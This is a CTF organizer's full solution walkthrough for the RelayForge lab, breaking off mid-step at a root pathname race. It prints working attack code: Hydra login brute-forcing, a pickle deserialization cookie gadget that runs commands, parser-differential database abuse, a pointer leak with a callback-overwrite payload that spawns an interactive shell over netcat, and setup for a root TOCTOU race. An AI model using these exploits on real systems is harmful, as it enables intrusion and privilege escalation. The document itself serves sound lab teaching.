# RelayForge Blind CTF Solution Walkthrough

> **Organizer-only full solution.** This walkthrough describes intentional command execution and unrestricted host-root execution. Use it only against the assigned disposable RelayForge instance. Do not distribute it as the initial player handout.
>
> **Evidence labels:** **Verified** means a cited local test was run successfully in this workspace. **Source-confirmed** means the behavior is present in the checked-in source/configuration. **Expected** means deployment behavior follows from that source but was not reproduced against EC2. **Unverified** means the needed artifact, live response, or runtime evidence was unavailable. No live EC2 exploit was run for this report.

This report is organized as an investigation. It describes first what the player can see, then how to form and test a hypothesis. It does not treat organizer source files as player-accessible evidence. The IP-only entry currently has blockers; these are recorded rather than papered over with invented clues.

## 7.1 Attack Chain Overview

The intended trust-boundary sequence is:

```text
EC2 IP
  -> enumerate HTTPS portal and the conditional Worker port range
  -> recover a portal account (currently a discoverability blocker)
  -> inspect normal login, cookies, and the linked cookie-policy page
  -> identify and trigger authenticated remember-cookie command execution
  -> enumerate Web-container identity, files, environment, and DB capability
  -> invoke the Web DB role's retained raw-request RPC
  -> compare Access decisions for duplicate profile values
  -> obtain an approved request and a short-lived host Worker
  -> download and reverse the exact Worker ELF from the public artifact route
  -> authenticate to the Worker, leak its PIE function address, overwrite callback
  -> obtain a host `relay` shell
  -> inspect the active job directory and readable Supervisor implementation
  -> race the diagnostic pathname and verify host UID 0 plus the generated flag
```

The actual trust boundaries matter. Web command execution is UID 65532 inside a container; it is not host execution. A normal request is approved and signed by Access, dispatched by a separate container, and launched by the root Supervisor as a transient host service running under `relay`. The last stage is not a Docker escape: it abuses the Supervisor's intentional path re-open race.

The public Worker ELF route is configured in the current workspace as an exact Nginx file alias backed by one read-only host-file mount. It is independent of Web RCE. That route is a local implementation change and must be included in the deployed release before a player can use it.

## 7.2 Flags

The scoring objective is the generated file `/var/lib/relayforge/flag/root.txt`, which is root-owned and mode `0600` according to the install/verification contract. Read it only after proving the shell is host UID 0. Do not publish its contents in a report or screenshot; redact the value while retaining the `RF{...}` format and command output that proves successful access.

The sample endpoint's `RF{browser_tunnel_success}` text is deliberately a fake flag. It proves only that the ordinary browser relay reached the private HTTP fixture. It does not prove Web RCE, a Worker shell, or root.

The intended final evidence is a root command stream showing `id` as UID 0, access to the root-only stage marker, and successful reading of the generated flag. The source specifies this outcome; no live flag or EC2 output was collected for this report.

**Screenshot checkpoint:** capture the `id` and root-only read result, but redact the flag contents. Include the marker and `RF{...}` format only if event policy permits.

## 7.3 Tools Used


## 7.4 Stage 1: Web Exploitation
The public Worker ELF route is configured in the current workspace as an exact Nginx file alias backed by one read-only host-file mount and is advertised in the current `robots.txt` response. It is independent of Web RCE. The clue is source-confirmed locally, but must still be verified against the deployed EC2 instance before claiming IP-only discoverability.
### 7.4.1 Establish the reachable surface from the IP

**Starting knowledge:** only the assigned IPv4 address. Do not assume a portal path, credentials, open Worker listener, or source package.

**Enumeration and why:** scan only the challenge's documented public ports. The configuration publishes HTTPS 443; host firewall configuration permits HTTPS and TCP 25000-25099 from the configured player CIDR. The Worker binds a selected port in that range only after a request launches, so an initial scan may show 443 open and every Worker port closed.

```bash
export RF_HOST='<assigned-ec2-ip>'
export RF_BASE="https://$RF_HOST"
RF_USERS='<path-to-local-usernames-wordlist>'
RF_PASSWORDS='<path-to-local-password-wordlist>'
RF_DASH="$(mktemp)"
nmap -Pn -sV -p 443,25000-25099 "$RF_HOST"
```

Open the HTTPS site in a browser, accept its lab certificate warning only after confirming the assigned IP, and use Burp's HTTP history to record redirects and visible paths. `GET /` redirects to `/login` in the Web implementation. The Nginx health route `/healthz` is a service check, not an attack clue. Do not assume the player knows the transient Worker range at this point; it becomes visible in the ordinary authenticated connection status after a job is launched.

**Expected finding:** HTTPS is the control plane. Before a job exists, no transient Worker is expected to be listening. **Source-confirmed:** Compose publishes only TCP 443; the host firewall source allows 443 and 25000-25099, and the Supervisor selects the Worker port dynamically. **Expected, not live-verified:** matching AWS security-group rules and the configured player CIDR are required for remote reachability.

**Screenshot checkpoint:** Nmap output with target IP partially redacted and the initial HTTPS page. Avoid capturing credentials or cookies.

### 7.4.2 Credential recovery is a current blocker, not a proven Hydra stage

**Starting knowledge:** the login page exposes username and password fields plus a CSRF token. No registration route or anonymous credential-recovery page exists in the checked-in Web routes. The database initializer seeds one account, but the account name and password are in organizer-side SQL, not in an IP-only player's evidence.

**Investigation:** in Burp, submit one deliberately invalid login and inspect the POST body, session cookie, response text/status, and any redirect on a valid login. The form uses `username`, `password`, and `csrf_token`; the failure page says “Incorrect username or password.” These observations explain how a form-checking tool might be configured, but they do not reveal a correct username or password.

Nginx applies `limit_req_zone ... rate=8r/m` to `/login`, with a burst of four and `nodelay`; failed authentication also sleeps for 0.35 seconds in the application. The configured 30-minute Flask lifetime is applied to sessions marked permanent after successful login; the pre-auth CSRF session is not marked permanent in `login_view`. Do not claim that the pre-auth cookie necessarily expires after 30 minutes. Regardless, an online run is rate-limited and still requires a suitable username/password list. A normal wordlist is not evidence that the seeded account can be recovered. Do not describe Hydra as a successful IP-only discovery step until this has been demonstrated against the disposable deployment with a deliberately bounded, published search space.

A lab-only Hydra syntax probe, **conditional on organizers supplying the search space**, can be derived from the Burp request. Capture a fresh CSRF/session pair first, disable Hydra's extra cookie-prefetch request, send the captured cookie header, and match the observed failure string. The exact quoting/escaping depends on the installed Hydra version; validate with one known-invalid and one known-valid test in a disposable clone before writing this as a guaranteed command. Do not run a large guessed list against an undeclared live target.

Capture a fresh pre-authentication session and CSRF token before each bounded run:

```bash
RF_JAR="$(mktemp)"
RF_PAGE="$(mktemp)"
curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"
RF_CSRF="$(sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE")"
RF_SESSION="$(awk '$6 == "session" { value=$7 } END { print value }' "$RF_JAR")"
RF_FORM="/login:username=^USER^&password=^PASS^&csrf_token=$RF_CSRF:G=:H=Cookie\\: session=$RF_SESSION:F=Incorrect username or password."
```

```text
Hydra module shape:
https-post-form "/login:<captured-form-fields>:G=:H=Cookie\\: session=<captured-session>:F=Incorrect username or password."
```

With the form/session fields captured and shell-escaped for the local Hydra build, the invocation shape is:

```bash
hydra -L "$RF_USERS" -P "$RF_PASSWORDS" -t 1 -W 8 -f \
  "$RF_HOST" https-post-form "$RF_FORM"
```

**Source-confirmed:** the database initialization seeds `guest` with password `guest-relay-2026`, and stores only a salted bcrypt-style `crypt()` hash. This is not player-discoverable from the IP. No password hash is exposed through a public route or the Web database role. See `DISCOVERABILITY_AND_VERIFICATION_GAPS.md` for the smallest fair fix.

**Screenshot checkpoint:** Burp request/response showing the form fields, CSRF field, failure indicator, and throttling response if encountered. Never capture the session cookie. Do not claim a recovered pair unless it was actually recovered and tested.

### 7.4.3 Establish a normal authenticated baseline, if credentials are provided by the event's recovery mechanism

Once an authorized test account is genuinely recovered, log in in a browser. Record the successful POST and redirect in Burp; confirm a signed `session` cookie and a second cookie named `remember_prefs`. Use Developer Tools > Storage/Application > Cookies to inspect attributes and value. `HttpOnly` prevents page JavaScript from reading the cookie; it does not prevent the browser's developer tools or Burp from displaying the HTTP cookie.

The same baseline can be recorded without a browser by reusing the fresh login page session and CSRF token, submitting the recovered pair, and inspecting the resulting cookies. This is conditional on a valid pair being provided or recovered through an event-approved mechanism; it does not resolve the IP-only credential gap.

```bash
RF_USER='<authorized username>'
RF_PASSWORD='<authorized password>'
curl -ksS -b "$RF_JAR" -c "$RF_JAR" \
  --data-urlencode "csrf_token=$RF_CSRF" \
  --data-urlencode "username=$RF_USER" \
  --data-urlencode "password=$RF_PASSWORD" \
  "$RF_BASE/login" -o /dev/null

RF_REMEMBER="$(awk '$6 == "remember_prefs" { value=$7 } END { print value }' "$RF_JAR")"
curl -ksS -b "$RF_JAR" "$RF_BASE/dashboard" -o "$RF_DASH"
grep -E '<option value=|name="service"|name="duration"' "$RF_DASH"
RF_TARGET="$(sed -n 's/.*<option value="\([^"]*\)".*/\1/p' "$RF_DASH" | head -n 1)"
```

Submit one ordinary connection request with the visible default target/service/duration. Inspect the POST in Burp, then follow its status page and temporary URL. Developer Tools' Network panel shows the page/API requests; the status JSON contains the request/job state and, only while running, the temporary port/token capability. Close this baseline tunnel before creating the longer-lived test request later.

The ordinary flow proves the application is a broker to an isolated endpoint. It does not imply host access. Once a successful login makes the cookie notice visible, click its **Cookie Policy** link rather than guessing `/cookie-policy`. The policy text names `remember_prefs`, calls it an encoded internal preference object, and mentions `JobTemplate` and `JobRunner` as reserved classes. This is a clue, though the policy's claim that the classes are “not used” is misleading relative to implementation.

**Screenshot checkpoint:** successful baseline request status, temporary URL with the token fully redacted, and the cookie-policy passage showing the named preference objects.

### 7.4.4 Identify the serialized cookie safely

In Developer Tools or Burp, copy the `remember_prefs` value from the successful login response. Decode the value as base64 and inspect, but do not unpickle, it locally. Python's opcode disassembler is safe for inspecting pickle instructions as data:

```bash
python3 -c 'import base64,sys; sys.stdout.buffer.write(base64.b64decode(sys.argv[1], validate=True))' \
  '<remember_prefs-value>' > /tmp/remember-prefs.pickle
python3 -m pickletools /tmp/remember-prefs.pickle
```

The normal cookie should identify a pickle global such as `prefs.RememberedPrefs` and a username state value. The combination of (a) an encoded serialized object, (b) a server-controlled deserialization point during dashboard processing, and (c) the policy's mention of additional object classes supports the hypothesis that client-controlled object reconstruction deserves scrutiny. It does not by itself prove code execution.

**Discovery limitation:** the cookie policy does not show `__setstate__`, the allowlist, or result handling. The anonymous player has no Web source download route. The dashboard is authenticated, and there is no public source artifact. The exact gadget fields and one-shot output route are therefore not independently derivable from the current public UI alone. The following implementation-specific steps become reproducible once a player has a legitimate source clue or organizer-approved hint; the gap document recommends one.

### 7.4.5 Build the gadget only after the clue identifies the class behavior

The source-confirmed behavior is: `JobTemplate.__setstate__` appends its `command` state to a class queue; a later stateful `JobRunner.__setstate__` pops and executes that text with `subprocess.Popen(..., shell=True)`. `remembered_username()` base64-decodes and restricted-unpickles the cookie, and `/dashboard` calls it after authentication. The result API returns a bounded named result once and unlinks it.

The normal cookie-policy hint supplies the class names but not those hook semantics. Given a source/hint that discloses the state hooks, construct a pickle locally from inert stand-in classes. The builder does not execute the command locally; the malicious state is interpreted only by the target when the cookie is sent to the authenticated dashboard.

```bash
rf_cookie_for() {
  RF_CMD="$1" python3 - <<'PY'
import base64
import os
import pickle
import sys
import types

module = types.ModuleType("prefs")
for name in ("JobTemplate", "JobRunner"):
    cls = type(name, (), {"__module__": "prefs"})
    setattr(module, name, cls)
sys.modules["prefs"] = module

template = module.JobTemplate()
template.command = os.environ["RF_CMD"]
runner = module.JobRunner()
runner.armed = True
print(base64.b64encode(pickle.dumps([template, runner], protocol=4)).decode())
PY
}
```

`runner.armed` ensures pickle serializes state for the runner, causing the target's `__setstate__` to run. It is not itself an authorization bypass.

The following helper repeats the HTTP primitive and retrieves output from the authenticated one-shot result endpoint. It creates a fresh 32-hex-character result name for each command. Start with harmless identity and marker checks; do not unpickle the generated value locally.

```bash
rf_web_exec() {
  local plain_command="$1"
  local result_name result_path captured cookie body attempt

  result_name="$(python3 -c 'import secrets; print(secrets.token_hex(16)+".txt")')"
  result_path="/tmp/relayforge-results/$result_name"
  captured="($plain_command) > $result_path.tmp 2>&1; mv -- $result_path.tmp $result_path"
  cookie="$(rf_cookie_for "$captured")" || return 1

  curl -ksS \
    -H "Cookie: session=$RF_SESSION; remember_prefs=$cookie" \
    "$RF_BASE/dashboard" \
    -o /dev/null || return 1

  attempt=0
  while [ "$attempt" -lt 40 ]; do
    attempt=$((attempt + 1))
    body="$(curl -ksS -H "Cookie: session=$RF_SESSION" "$RF_BASE/api/result/$result_name")"
    if printf '%s' "$body" | python3 -c \
      'import json,sys; raise SystemExit(0 if "output" in json.load(sys.stdin) else 1)' \
      2>/dev/null
    then
      printf '%s' "$body" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["output"], end="")'
      return 0
    fi
    sleep 0.1
  done

  echo 'no one-shot result returned' >&2
  return 1
}
```

The application redirects child stdout/stderr to `/dev/null`; the implemented way to retrieve output is its one-shot result directory/API. That route and filename pattern must be found in a source clue or hint: they are not linked from the UI. With that discovery, the command wrapper can capture the result into a unique 32-hex-character `.txt` file and poll `/api/result/<name>` until the authenticated one-shot read succeeds. Use a harmless command first:

```bash
rf_web_exec 'id; pwd; cat /opt/relayforge/web/STAGE_1_WEB.txt'
```

`rf_web_exec` in the existing manual is a helper that sends the generated cookie to `/dashboard`, then polls the result API; it is not a repository exploit script. Its internals should be understood before use: one random result filename, shell redirection, authenticated dashboard request to trigger deserialization, bounded polling, JSON extraction. It is still a large combined action, so the investigation should test these separately: first `id`, then `pwd`, then the Web-only marker.

**Expected finding:** UID/GID 65532 inside the Web container and `RELAYFORGE_STAGE=1_WEB_CONTAINER`. **Source-confirmed** by the container identity and marker install. **Not a host shell.**

**Screenshot checkpoint:** Burp dashboard request with the cookie value redacted; separate terminal output of `id` and the Web marker. Do not show the malicious cookie.

### 7.4.6 Enumerate Web capabilities one question at a time

After obtaining Web command execution, establish identity and working directory first:

```bash
rf_web_exec 'id'
rf_web_exec 'pwd'
```

Expected: UID 65532 and an application working directory under `/opt/relayforge/web`. Next enumerate only app-owned files:

```bash
rf_web_exec 'find /opt/relayforge/web -maxdepth 3 -type f -print | sort'
```

Then inspect environment variable **names** without dumping every password value:

```bash
rf_web_exec 'env | cut -d= -f1 | sort'
rf_web_exec 'printf "DB_HOST=%s\nDB_NAME=%s\nDB_USER=%s\n" "$DB_HOST" "$DB_NAME" "$DB_USER"'
```

The result should show a `relay_web` database identity and no Docker or Supervisor socket. Check the specific expected privileged sockets without treating a missing path as a failure of the exploit:

```bash
rf_web_exec 'ls -l /var/run/docker.sock /run/relayforge/supervisor.sock 2>&1'
```

Finally inspect the Web database adapter, after the file enumeration has revealed its actual path:

```bash
rf_web_exec 'sed -n "/def submit_raw_request/,/return str/p" /opt/relayforge/web/app/db.py'
```

This reveals a helper that calls the database function with a username, target, service, duration, and raw options string. The `submit_raw_request` Python name is now a discovered source-level identifier, not an assumption made before file enumeration. The function's docstring notes that no HTTP route invokes it. The next question is whether the restricted DB role may execute the RPC and whether another service interprets the raw options differently.

**Screenshot checkpoints:** separate outputs for identity, file inventory, DB variable names, socket availability, and adapter source. Redact values that contain secrets.

## 7.5 Stage 2: Database and Policy Bypass

### 7.5.1 Derive the database capability from the Web adapter

The Web source shows normal HTTP code calling safe operations, while the helper accepts an additional raw options field. The runtime environment supplies `DB_HOST`, `DB_NAME`, `DB_USER`, and `DB_PASSWORD`. The credential value should not be printed or included in report captures. The Web container already has `psycopg2`; use a parameterized SQL call from a shell command executed inside that container, rather than trying to connect to PostgreSQL from the player's workstation.

The first experiment should use an ordinary safe request (the UI already provides one) and inspect its request status. Then use the discovered raw RPC with one valid baseline options string and capture its returned UUID. Poll the already observed status resource in Burp/DevTools and record `request_state`, `request_reason`, and later `job_state`. This establishes how asynchronous approval is visible before introducing duplicate keys.

When ready to test the parser hypothesis, compare at least these values, one request at a time:

```text
profile=safe&note=manual
profile=legacy&note=manual
profile=safe&note=manual&profile=legacy
profile=legacy&note=manual&profile=safe
```

Keep target, service, duration, account, and note format constant. Use the returned request identifier to poll the authenticated status route. If a request reaches approved/running only when `safe` appears first, record that as black-box evidence that the Access decision is order-sensitive. A running Worker may then independently reveal whether it uses the opposite end of the same options string.

**Source-confirmed:** the DB schema revokes private-table access from service roles but grants `relay_web` execution on `relay_web_api.submit_raw_request(...)`; the normal HTTP handlers do not invoke it. The authenticated status function returns request/job state, port and token to the owner. No direct PostgreSQL connection from the EC2 player's host is intended.

### 7.5.2 Establish the duplicate-key parser differential experimentally

Do not claim access to `control/policy.py`; it is organizer source in a separate container and no public source download exists. The player can infer the Access side with controlled comparisons. In the challenge implementation, the Access parser accepts one or two `profile` pairs, requires the first to be `safe`, and reports the first profile as effective. The Worker independently parses the same signed bytes and retains the last profile. Tests confirm the intended Access differential input is:

```text
profile=safe&note=manual&profile=legacy
```

Interpretation: Access sees first=`safe` and allows; Worker sees last=`legacy` and enables legacy-only debug commands. Reversing the two profiles should fail Access. This should be documented as a behavior inferred from controlled request outcomes plus Worker observation, not as source the player downloaded.

**Verified locally:** `tests/test_policy.py` passed and asserts that Access keeps the first profile and accepts the duplicate differential value. This is a local unit test, not an EC2 replay.

**Screenshot checkpoint:** capture paired request statuses for each order variant, the reason/rejection text if returned, and the later safe-vs-legacy Worker command result. Redact account and session data.

### 7.5.3 Submit the duplicate-profile request and observe the asynchronous job

Only after confirming the raw helper's accepted argument shape should the player make the duplicate request. The manual's direct call uses Python and `psycopg2` inside Web, with SQL placeholders for the five database parameters. Explain each field: current authenticated username, dashboard-granted target identifier, allowed `echo` service, duration within 30-420 seconds, and the experimentally derived raw options value. Store the returned request UUID, then poll the normal status API rather than scanning blindly for a token.

A running status should contain an endpoint port in 25000-25099, a 48-character lowercase-hex token, and a job UUID. These are short-lived capabilities. The configured Worker lifetime is at most 420 seconds, so perform binary analysis before issuing the exploit request when possible. If it expires, create a fresh request and discard the old token and leak.

After confirming the helper's argument shape, issue the duplicate-profile request from inside the Web container. The SQL function call is parameterized; its values are the authenticated username, dashboard-granted target, allowed `echo` service, duration, and raw options string. Keep the database password inside the container and do not print it.

```bash
RF_DB_COMMAND="python3 -c 'import os,psycopg2; c=psycopg2.connect(host=os.environ[\"DB_HOST\"],dbname=os.environ[\"DB_NAME\"],user=os.environ[\"DB_USER\"],password=os.environ[\"DB_PASSWORD\"]); q=c.cursor(); q.execute(\"SELECT relay_web_api.submit_raw_request(%s,%s,%s,%s,%s)\",(\"$RF_USER\",\"$RF_TARGET\",\"echo\",420,\"profile=safe&note=manual&profile=legacy\")); value=q.fetchone()[0]; c.commit(); print(value)'"
RF_REQUEST_ID="$(rf_web_exec "$RF_DB_COMMAND" | tail -n 1)"
printf 'request id: %s\n' "$RF_REQUEST_ID"
```

Poll the ordinary authenticated status route for up to 45 seconds. Stop at a terminal state and inspect the returned JSON rather than continuing with missing capabilities.

```bash
RF_ATTEMPT=0
while [ "$RF_ATTEMPT" -lt 180 ]; do
  RF_ATTEMPT=$((RF_ATTEMPT + 1))
  RF_STATUS="$(curl -ksS -H "Cookie: session=$RF_SESSION" "$RF_BASE/api/status/$RF_REQUEST_ID")"
  RF_STATE="$(printf '%s' "$RF_STATUS" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("job_state") or "")')"
  case "$RF_STATE" in
    running|failed|expired|stopped) break ;;
  esac
  sleep 0.25
done

printf '%s\n' "$RF_STATUS" | python3 -m json.tool
if [ "$RF_STATE" = running ]; then
  RF_PORT="$(printf '%s' "$RF_STATUS" | python3 -c 'import json,sys; print(json.load(sys.stdin)["endpoint_port"])')"
  RF_TOKEN="$(printf '%s' "$RF_STATUS" | python3 -c 'import json,sys; print(json.load(sys.stdin)["session_token"])')"
  RF_JOB_ID="$(printf '%s' "$RF_STATUS" | python3 -c 'import json,sys; print(json.load(sys.stdin)["job_id"])')"
  printf 'port=%s job=%s token_length=%s\n' "$RF_PORT" "$RF_JOB_ID" "${#RF_TOKEN}"
fi
```

**Screenshot checkpoint:** Burp status response with username/session/token redacted except for format/length; show approved/running states, port range, and job ID partly masked.

## 7.6 Stage 3: Worker Discovery and Access

### 7.6.1 Obtain the exact deployed ELF

The current workspace has a public Nginx alias at `/artifacts/relay-worker`, backed by a read-only mount of the exact deployed binary. The current Nginx configuration advertises the path in `robots.txt`, allowing ordinary web enumeration to reveal it without guessing the URL. This clue is source-confirmed locally; availability from the assigned EC2 instance remains unverified until redeployment and a remote request. Do not claim path discovery by Nmap.

```bash
curl -kfsS "$RF_BASE/robots.txt"
curl -kfsS "$RF_BASE/artifacts/relay-worker" -o relay-worker
file relay-worker
sha256sum relay-worker
readelf -hW relay-worker
readelf -lW relay-worker
readelf -dW relay-worker
strings -a relay-worker | grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
strings -a -t x relay-worker | grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
objdump -s -j .rodata relay-worker > /tmp/relay-worker.rodata.txt
objdump -d -Mintel relay-worker > /tmp/relay-worker.disassembly.txt
```

The current workspace config maps only `/opt/relayforge/bin/relay-worker` read-only into Nginx and serves it at this exact route. It does not expose a directory listing and does not mount the host file into Web. **Source-confirmed in the current workspace; deployment unverified.** The download checksum is useful for repeatability, but without a separately published trusted expected digest it does not prove the downloaded file is the intended production build. Save the digest in the report only after acquiring it from the target.

Expected ELF characteristics from the Linux Makefile and installer checks are AMD64 ELF, PIE (`ET_DYN`), non-executable stack, GNU RELRO, and immediate binding. Do not infer that protections eliminate the intentional callback flaw; the challenge uses an information disclosure and overwrites an existing callback rather than injecting shellcode.

**Screenshot checkpoint:** capture `file`, ELF header/type, program headers, dynamic RELRO/binding evidence, and the SHA-256 of the downloaded file. On macOS use `shasum -a 256` or install GNU binutils for `sha256sum`, `readelf`, `strings`, and `objdump`.

### 7.6.2 Ghidra workflow: strings to handlers

1. Start Ghidra, create a non-shared project for the assessment, and choose **File > Import File**. Select the downloaded `relay-worker`; confirm the import format reports ELF 64-bit little-endian AMD64/x86-64. Do not substitute a locally rebuilt binary: the deployed ELF is authoritative.
2. Open it in CodeBrowser and accept auto-analysis with default analyzers. Save the project and record the Ghidra version and SHA-256 of the input file.
3. Open **Window > Defined Strings** (or use **Search > For Strings** depending on Ghidra version). Search for protocol-related strings such as `TOKEN `, `ERR auth`, `LEAK`, `OVERFLOW`, `worker_shell=`, `CONNECT`, `ERR size`, and the shell banner.
4. Double-click a string to navigate to its data location. Use **References > Show References To** (or the XREF listing) to reach the function that formats or compares it. Rename only in the analyst's Ghidra project, and retain the original address in notes.
5. Follow callers/callees in the Function Graph and Listing. Identify the top-level accepted socket/client handler, then the command handler. The implementation distinguishes an HTTP request line from the line-oriented command protocol; an authenticated command session begins with `TOKEN <48-hex-token>`.
6. Inspect the token comparison and the error path. A controlled live pair later should show a wrong token rejected and the correct token accepted for the job. This binds the static protocol interpretation to runtime behavior.

**Expected findings:** string references lead to protocol dispatch; `LEAK` and `OVERFLOW` are gated by a legacy-mode boolean; `CONNECT` performs the ordinary private endpoint tunnel. A binary string alone is not proof that an operation is reachable or exploitable; follow control-flow predicates and verify with a safe/legacy comparison.

**Screenshot checkpoint:** Ghidra Defined Strings results, an XREF into the command handler, and the branch showing legacy-mode gating. Redact token material in any live transcript.

### 7.6.3 Derive parser order from implementation, then correlate with the black-box experiment

Search Ghidra strings/XREFs for the option keys `profile` and `note`, then follow their references into the option parser. The source implementation `parse_options_last_wins` walks each `&`-delimited pair in order and assigns `last_legacy` each time it sees `profile`; after the loop, the output mode is based on the final occurrence. In assembly, inspect the repeated scan/branch and the store that updates the mode on each matching key. The final store before return controls the parsed mode. Do not rely only on a decompiler variable name such as `last_legacy`; use the Listing to confirm the repeated store and the conditional that accepts `safe` or `legacy`.

Correlate with live outcomes: request `safe` first/`legacy` last and observe Access approval, then use the Worker `LEAK` command. Reverse order as a negative control and observe Access rejection. The two independent observations demonstrate a first-vs-last interpretation mismatch across components.

### 7.6.4 Discover the public Worker port and test authentication

Do not expect the pre-request Nmap scan to show the eventual Worker. Once the status response reports the selected port, scan only that port and connect:

```bash
RF_BAD_TOKEN="$(python3 -c 'import sys; value=sys.argv[1]; print(("1" if value[0]=="0" else "0")+value[1:])' "$RF_TOKEN")"
nmap -Pn -sV -p "$RF_PORT" "$RF_HOST"
printf 'TOKEN %s\n' "$RF_BAD_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
printf 'TOKEN %s\nQUIT\n' "$RF_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
```

The invalid token should receive `ERR auth`; the valid token should receive a Worker banner containing the job UUID and `OK`. This is a bearer-token gate, not a general shell. The host firewall allows Worker ports only from configured player CIDR, and an AWS security group must separately allow the selected range. A range scan from outside that CIDR may show filtered ports even with a running Worker.

**Screenshot checkpoint:** narrow Nmap result and paired invalid/valid protocol transcript with token fully redacted.

## 7.7 Stage 4: Native Worker Exploitation

### 7.7.1 Find and understand the disclosure

From the command handler's legacy-gated branch in Ghidra, follow the `LEAK` string reference and its output formatter. The source-confirmed behavior prints the live address of `worker_shell` using `%p`. In the Listing, confirm that the pointer expression refers to the shell function, not merely a global or string. This leak defeats PIE address randomization for the current Worker process.

Run the command only after authentication, then retain the response for that Worker lifetime:

```bash
RF_PROBE="$(printf 'TOKEN %s\nLEAK\nQUIT\n' "$RF_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT")"
printf '%s\n' "$RF_PROBE"
RF_LEAK="$(printf '%s\n' "$RF_PROBE" | sed -n 's/^worker_shell=//p')"
test -n "$RF_LEAK" && printf 'worker_shell=%s\n' "$RF_LEAK"
```

The control experiment is the same `LEAK` command against a safe-mode Worker: it should return `ERR command`. Do not carry a pointer across Worker restarts or expiry; ASLR and process lifetime make it stale.

### 7.7.2 Derive the frame layout and copy bound in Ghidra

Search the binary for `OVERFLOW ` and follow its XREF into the command handler. Trace the size parser: it rejects sizes above `sizeof(debug_frame)`, allocates a payload of that size, reads exactly the requested number of bytes, and passes it to `vulnerable_debug` only when legacy mode is active.

In the decompiler, follow the callee and inspect its stack variables. The source-level struct contains a 128-byte byte array followed by an 8-byte function pointer; compile-time assertions require callback offset 128 and total size 136 on a 64-bit target. In Ghidra, do not take a decompiler's guessed `undefined[136]` type as proof. In the Listing, check:

- the frame base address and byte stores in the copy loop;
- the loop termination condition against the requested length;
- the stack slot loaded for the indirect call after the copy;
- the offset of that slot relative to the frame start; and
- the maximum accepted request length in the caller.

The compiled Linux binary should show the copy loop able to write at most 136 bytes into a 136-byte frame, and then invoke the function pointer. The first 128 bytes fill `data`; the next eight replace `next`. This is a bounded adjacent-field overwrite, not an arbitrary-length copy. With a valid leak, set `next` to the current `worker_shell` address.

Use **Window > Function Graph** on the callee to capture the loop and indirect call blocks. Compare decompiler output against disassembly; report the machine-level store/load/call locations and the arithmetic, not only the inferred C struct. The production artifact is expected to retain symbols because the Makefile uses `-g0` but does not strip the ELF; if symbols are absent, discover functions by string references and control flow rather than assuming names.

**Screenshot checkpoint:** Ghidra decompiler and Listing side-by-side showing 128-byte field, callback stack slot, bounded 136-byte request, and indirect call. Include the ELF hash in analyst notes.

### 7.7.3 Prove the overwrite and host `relay` shell

Send exactly the accepted size: 128 filler bytes followed by the leaked address as little-endian 64-bit data. Do not append a newline to the 136-byte binary frame. Keep stdin open after the payload so the child shell can use the TCP connection interactively.

```bash
{
  printf 'TOKEN %s\nOVERFLOW 136\n' "$RF_TOKEN"
  python3 -c \
    'import struct,sys; sys.stdout.buffer.write(b"A"*128 + struct.pack("<Q", int(sys.argv[1], 0)))' \
    "$RF_LEAK"
  cat
} | nc "$RF_HOST" "$RF_PORT"
```

The Worker invokes the overwritten callback with the client descriptor. Pointing it at `worker_shell` duplicates that descriptor onto standard input/output/error and executes `/bin/sh -i` under the Worker service identity. This is host account `relay`, not UID 0.

Run one proof command at a time in the interactive shell:

```sh
id
pwd
cat /var/lib/relayforge/stages/STAGE_2_WORKER.txt
cat /var/lib/relayforge/stages/STAGE_3_ROOT.txt 2>&1
cat /var/lib/relayforge/flag/root.txt 2>&1
```

Expected: host `relay`, an active job working directory, Stage 2 readable, Stage 3 and root flag denied. That contrast proves host account access without overstating privilege.

**Source-confirmed:** exact struct, copy, pointer disclosure, and shell behavior in `worker/relay-worker.c`; **Verified locally:** Worker/payload source audits and tests cover parser/protocol semantics where cited, but no deployed ELF exploit was run here. **Screenshot checkpoint:** shell banner and `id`, Stage 2 read, and both permission denials. Mask job UUID if required by event policy.

## 7.8 Stage 5: Supervisor TOCTOU

### 7.8.1 Discover the host interface only after earning the Worker shell

The next investigation begins from the shell's observed `pwd` and identity. Inspect nearby runtime/socket directories without assuming a path first:

```sh
ls -la /run
ls -la /run/relayforge 2>&1
find /opt/relayforge/runtime -maxdepth 1 -type f -printf '%f\n' 2>/dev/null | sort
```

The Stage 2 marker and directory listing direct attention to the Supervisor Unix socket and installed runtime program. Confirm permissions and inspect the relevant source after the filesystem reveals the names:

```sh
ls -l /run/relayforge/supervisor.sock
sed -n '560,700p' /opt/relayforge/runtime/supervisor.py
```

The path is not public before this stage: it is not mounted into the Web container, and the Worker account reaches it only through its host filesystem/group boundary. Supervisor checks Unix peer UID, active job identity, PID membership in the Worker cgroup, expiry, exact diagnostic filename, ownership, mode, link count, file type, size, and exact initial bytes.

The source then reveals the flaw: it opens and validates the benign file, closes the descriptor, sends `{"ok":true,"state":"validated"}`, sleeps 250 ms, and executes the pathname again as unrestricted root. The validated object and executed object can differ if the active Worker atomically replaces the pathname after acknowledgement.

The current Supervisor implements `launch`, `stop`, and `diagnose`; there is no `archive` operation. `tests/check_supervisor_snapshot.py` specifically rejects the retired archive read primitive. Any guide or report that describes a flag-reading `archive` shortcut contradicts this deployment and must be removed.

### 7.8.2 Reproduce the pathname race and verify identity

Get the job ID from the parent directory containing the current Worker `work` directory; do not accept a guessed value. Create the exact benign file required by the Supervisor check, and independently verify its owner, mode, link count, byte count, and content before requesting the operation:

```sh
RF_JOB_ID="$(basename "$(dirname "$PWD")")"
printf "#!/bin/sh\nprintf 'RelayForge diagnostic OK\\n'\n" > diagnostic.sh
chmod 700 diagnostic.sh
wc -c diagnostic.sh
stat -c 'owner=%U group=%G mode=%a links=%h size=%s' diagnostic.sh
cat diagnostic.sh
```

The expected byte length is 46. The accepted script bytes are fixed in the Supervisor source; this check is not an invitation to place payload content in the initial file. Create the replacement separately so it is not present at the validated pathname:

```sh
